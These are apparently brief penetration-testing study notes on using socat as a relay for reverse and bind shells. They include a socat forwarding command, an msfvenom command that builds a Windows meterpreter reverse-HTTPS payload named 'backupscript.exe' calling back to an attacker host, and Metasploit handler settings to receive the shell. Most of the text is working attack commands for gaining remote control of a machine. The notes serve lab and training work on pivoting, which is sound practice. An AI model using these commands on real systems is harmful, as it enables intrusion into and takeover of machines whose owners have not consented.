* Socat Revshell
- bidirectional relay tool to create pipe sockets between 2 independent network channels w/out needing to use SSH tunneling.
- acts as redirector that can listen on one host & port & fwd data to another IP addr & port

** Start Listener
- ~socat TCP4-LISTEN:8080, fork TCP4:10.10.14.18:80~ (webserver)

** Create Windows Payload
- ~msfvenom -p windows/x64/meterpreter/reverse_https LHOST=172.16.5.129 -f exe -o backupscript.exe LPORT=8000~

** msfconsole
- ~use exploit/multi/handler~
- ~set payload windows/x64/meterpreter/reverse_https~
- ~set lhost 0.0.0.0~
- ~set lport 80~

* socat bind shell
- windows server will start listener & bind to port
